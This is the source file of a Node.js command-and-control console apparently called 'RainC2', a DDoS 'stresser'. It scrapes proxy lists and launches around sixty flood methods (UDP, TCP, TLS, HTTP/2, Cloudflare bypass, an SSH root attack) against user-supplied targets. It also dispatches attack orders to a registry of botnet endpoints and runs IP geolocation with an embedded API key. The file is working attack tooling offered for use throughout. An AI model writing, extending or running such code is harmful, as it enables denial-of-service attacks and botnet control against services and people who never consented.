#!/usr/bin/env node
/*  RainC2 – per-method switch-block edition  */
const { exec } = require('child_process');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const version = '1.0.0';
let processList = [];

/*  ----------  colours  ----------  */
const cyan = '\x1b[96m', bold = '\x1b[1m', kuning_emas = '\x1b[93m', Reset = '\x1b[0m',
      biru = '\x1b[36m', biru_terang = '\x1b[94m', biru_tua = '\x1b[38;2;0;0;139m',
      teksmerah = '\x1b[31m', teksungu = '\x1b[95m', hijau = '\x1b[38;2;144;238;144m',
      orange = '\x1b[38;2;255;165;0m';

/*  ----------  rl  ----------  */
const steven = readline.createInterface({ input: process.stdin, output: process.stdout });

/*  ----------  tiny utils  ----------  */
const sleep = ms => new Promise(r => setTimeout(r, ms));
const execPromise = cmd => new Promise((res, rej) => exec(cmd, (e, so, se) => e ? rej(e) : res(so)));

/*  ----------  banner  ----------  */
async function banner() {
  console.clear();
  console.log(`
${orange}Welcome User To RainC2 Tools${Reset}
${bold}${hijau}DEVELOPER: Stevee${Reset}
${bold}${biru_tua}THANKS TO: Err0x420${Reset}
${bold}${biru_terang}Type 'Help' For Showing All Feature Command Tools RainC2${Reset}`);
}

/*  ----------  scrape proxy / ua  ----------  */
async function scrapeProxy() {
  try {
    const res = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    fs.writeFileSync('proxy.txt', await res.text(), 'utf-8');
  } catch(e) {
    console.log("Failed to scrape proxies.");
  }
}
async function scrapeUserAgent() {
  try {
    const res = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    fs.writeFileSync('ua.txt', await res.text(), 'utf-8');
  } catch(e) {
      console.log("Failed to scrape user agents.");
  }
}

/*  ----------  bootup (no password)  ----------  */
async function bootup() {
  console.log('|| ▓░░░░░░░░░ || 10%');
  await execPromise(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
  console.log('|| ▓▓▓▓▓▓▓▓▓▓ || 100%');
  await scrapeProxy();
  await scrapeUserAgent();
  await sleep(700);
  console.clear();
  console.log(`Welcome Guys To RainC2 Stresser Tools ${version}`);
  await sleep(1000);
  await banner();
  console.log('==========================================================================');
  sigma();
}

/*  ----------  dynamic method loader  ----------  */
const METHOD_FILES = [
  'black.js','blast.js','browser.js','bypass.js','cat.js','cf.js','chaptcha.js','cibi.js','cici.js','ciko.js','coki.js',
  'DeathPing.js','fire.js','flaybypass.js','flayingraw.js','flood.js','flood1.js','geckold.js','glory.js','god.js',
  'H2-MERIS.js','h2-raw.js','h2.js','httpx.js','kill-do.js','kill-wifi.js','maklo.js','mc.js','mixed.js','ninja.js',
  'pidoras.js','ping.js','quantum.js','raw.js','sad.js','sadboy.js','samp.js','spampair.js','steven.js','storm.js',
  'tcp.js','temp.js','thspeed.js','thunder.js','tls.js','uam.js','udp.js','xin.js','xyn.js','zeus-flash.js',
  'zeus-flood.js','zeus-love.js','zeus-raw.js','zeus-sad.js','zeus-steven.js','zeus-tls.js','zs-browser.js',
  'zs-bypass.js','zxm.js'
];
const METHODS = METHOD_FILES.map(f => path.basename(f, '.js').toLowerCase());

/*  ----------  complete 60+ method switch  ----------  */
// Note: This function had many duplicate 'if' blocks. They have been removed.
async function legacyAttack(methods, target, port, duration) {
  const metode = path.join(__dirname, 'lib/cache', `${methods}.js`);

  // A more efficient way to handle this might be a switch statement or an object lookup,
  // but for now, we'll keep the if-else structure.
  
  const requiresProxy = ![
    'zeus-tls', 'zs-browser', 'flayingraw', 'black', 'ninja', 'deathping', 'h2', 
    'h2-raw', 'H2-MERIS', 'tls', 'uam', 'thunder', 'zeus-raw'
  ].includes(methods);

  const requiresPort = ['udp', 'tcp', 'samp', 'mc'].includes(methods);
  
  let command;

  pushOngoing(target, methods, duration);

  if (methods === 'mixed') {
      const zeus_flash = path.join(__dirname, 'lib/cache/zeus-flash.js');
      const zs_bypass  = path.join(__dirname, 'lib/cache/zs-bypass.js');
      exec(`node ${zeus_flash} ${target} ${duration} 100 10 proxy.txt`);
      exec(`node ${zs_bypass}  ${target} ${duration} 100 10 proxy.txt`);
      return sigma();
  } else if (requiresPort) {
      command = `node ${metode} ${target} ${port} ${duration}`;
  } else if (methods === 'ping') {
      command = `node ${metode} ${target} 66507 6 1 ${duration}`;
  } else if (methods === 'kill-do') {
      command = `node ${metode} ${target} 22 root ${duration}`;
  } else if (methods === 'zeus-raw') {
      command = `node ${metode} ${target} ${duration}`;
  } else {
      const proxyArg = requiresProxy ? ' proxy.txt' : '';
      command = `node ${metode} ${target} ${duration} 100 10${proxyArg}`;
  }
  
  exec(command);
  sigma();
}

/*  ----------  attack wrapper (generic fallback)  ----------  */
async function handleAttack(method, args) {
  if (args.length < 3) {
    console.log(`Example: ${method} <Target> <Port> <Duration>\n${method} https://google.com 443 120`);
    return sigma();
  }
  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    // Fixed the space in the API call
    const { data: result } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    console.clear();
    console.log(`
                              ⣿                             
                             ⣿⣿⣿                            
                           ⣿⣿⣿⣿⣿⣿                       
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿                       
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                 
                     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                  ⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                 ⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                ⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿               
                ⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿             
               ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿              
               ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿           
                ⣿⣿⣿   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿             
                 ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿            
                   ⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       
                     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿          
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
${bold}${cyan}Attack Has Been Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods${Reset}  : ${method}
${bold}${cyan}ISP${Reset}      : ${result.isp}
${Reset}Ip${Reset}       : ${result.query}
${bold}${cyan}AS${Reset}       : ${result.as}
`);
    // This calls the more robust legacyAttack function
    legacyAttack(method, target, port, duration);
  } catch (e) {
    console.log(`Oops Something Went Wrong: Invalid target or API failure.`);
    return sigma();
  }
}

/*  ----------  push / list on-going  ----------  */
function pushOngoing(target, method, duration) {
  const start = Date.now();
  processList.push({ target, method, start, duration });
  setTimeout(() => {
    const idx = processList.findIndex(p => p.method === method && p.start === start);
    if (idx !== -1) processList.splice(idx, 1);
  }, duration * 1000);
}
function ongoingAttack() {
  console.log('\nOngoing Attacks:\n');
  if (processList.length === 0) {
      console.log('No attacks currently running.');
  } else {
    processList.forEach(p => {
        console.log(`Target: ${p.target}\nMethod: ${p.method}\nDuration: ${p.duration}s\nSince: ${Math.floor((Date.now() - p.start) / 1000)}s ago\n`);
    });
  }
  sigma();
}

/*  ----------  botnet endpoints  ----------  */
async function AttackBotnetEndpoints(args) {
  if (args.length < 3) {
    console.log(`Example: botnet <Target> <Duration> <Method>\nbotnet https://google.com 120 zeus-flood`);
    return sigma();
  }
  const [target, duration, methods] = args;
  let botnetData, successCount = 0;
  const timeout = 20000, validEndpoints = [];
  try {
    botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  } catch {
    botnetData = { endpoints: [] };
  }
  const requests = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=${target}&time=${duration}&methods=${methods}`, { timeout });
      if (status === 200) { successCount++; validEndpoints.push(ep); }
    } catch {}
  });
  await Promise.all(requests);
  botnetData.endpoints = validEndpoints;
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2)); } catch {}
  console.log(`Sent to ${successCount} bot(s).`);
  sigma();
}

async function processBotnetEndpoint(args) {
  if (args.length < 1) {
    console.log(`Example: addsrv <Endpoint>\naddsrv http://1.1.1.1:2000/zeusnet`);
    return sigma();
  }
  const raw = args[0];
  try {
    const u = new url.URL(raw);
    const endpoint = `http://${u.host}/zeusnet`;
    let botnetData = { endpoints: [] };
    try { botnetData = JSON.parse(await fs.promises.readFile('./lib/botnet.json', 'utf8')); } catch {}
    if (botnetData.endpoints.includes(endpoint)) return console.log('Endpoint already listed.'), sigma();
    botnetData.endpoints.push(endpoint);
    await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    console.log(`Added ${endpoint}`);
  } catch { console.log('Bad endpoint URL.'); }
  sigma();
}

async function checkBotnetEndpoints() {
  let botnetData = { endpoints: [] };
  try { botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8')); } catch {}
  const timeout = 20000, valid = [];
  const checks = botnetData.endpoints.map(async ep => {
    try {
      const { status } = await axios.get(`${ep}?target=https://google.com&time=1&methods=ninja`, { timeout });
      if (status === 200) valid.push(ep);
    } catch {}
  });
  await Promise.all(checks);
  try { fs.writeFileSync('./lib/botnet.json', JSON.stringify({ endpoints: valid }, null, 2)); } catch {}
  console.log(`${valid.length}/${botnetData.endpoints.length} bot(s) online.`);
  sigma();
}

/*  ----------  IP tracker  ----------  */
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <IP>\ntrack-ip 1.1.1.1`);
    return sigma();
  }
  const [target] = args;
  if (target === '0.0.0.0') return console.log('Nice try.'), sigma();
  try {
    const [geo, who] = await Promise.all([
      // Fixed spaces in API calls
      axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=8fd0a436e74f44a7a3f94edcdd71c696&ip=${target}`),
      axios.get(`https://ipwho.is/${target}`)
    ]);
    const g = geo.data, w = who.data;
    console.clear();
    console.log(`
Tracking IP Address Result
========================================================================
Flag : ${g.country_flag}
Country : ${g.country_name} | Capital : ${g.country_capital}
City : ${g.city} | ISP : ${g.isp} | Org : ${g.organization}
Lat : ${g.latitude} | Long : ${g.longitude}
Google Maps : https://www.google.com/maps/place/${w.latitude}+${w.longitude}`);
  } catch {
    console.log('IP lookup failed.');
  }
  sigma();
}

/*  ----------  command router  ----------  */
async function sigma() {
  steven.question('\x1b[91mR\x1b[93ma\x1b[92mi\x1b[96mn\x1b[94mC\x1b[95m2\x1b[0m ', async input => {
    const [cmd, ...args] = input.trim().split(/\s+/);
    const command = cmd.toLowerCase();

    // The main issue was here. The code below was inside the 'help' command's console.log
    if (command === 'help') {
      console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
help      │ ----               │ Show all commands
methods   │ ----               │ List all attack methods
proxy     │ ----               │ Update proxy list
ongoing   │ ----               │ View running attacks
cls       │ ----               │ Clear terminal
botnet    │ <T> <D> <M>        │ Launch via botnet
addsrv    │ <Endpoint>         │ Add botnet node
botnet-test│ ----              │ Check botnet health
track-ip  │ <IP>               │ Geo IP lookup
──────────┼────────────────────┼────────────────────────────────────
Attack Commands: <method> <target> <port> <duration>
All available methods can be listed with the 'methods' command.
`);
      return sigma();
    }

    if (command === 'methods') {
      console.log('Supported methods:\n' + METHODS.join(', '));
      return sigma();
    }

    if (command === 'proxy') {
      await scrapeProxy();
      console.log('Proxy list updated.');
      return sigma();
    }

    if (command === 'ongoing') {
      ongoingAttack();
      // No need to call sigma() here, ongoingAttack already does.
      return;
    }

    if (command === 'cls') {
      await banner();
      return sigma();
    }

    if (command === 'botnet') {
      await AttackBotnetEndpoints(args);
    } else if (command === 'addsrv') {
      await processBotnetEndpoint(args);
    } else if (command === 'botnet-test') {
      await checkBotnetEndpoints();
    } else if (command === 'track-ip') {
      await trackIP(args);
    } else if (METHODS.includes(command)) {
      await handleAttack(command, args);
    } else {
      console.log(`Command '${command}' not found. Type 'help' for a list of commands.`);
      sigma();
    }
  });
}

/*  ----------  cleanup on exit  ----------  */
process.on('exit', () => {
  try { fs.unlinkSync('proxy.txt'); } catch {}
  try { fs.unlinkSync('ua.txt'); } catch {}
});
process.on('SIGINT', () => process.exit());
process.on('SIGTERM', () => process.exit());

/*  ----------  kick-off  ----------  */
bootup();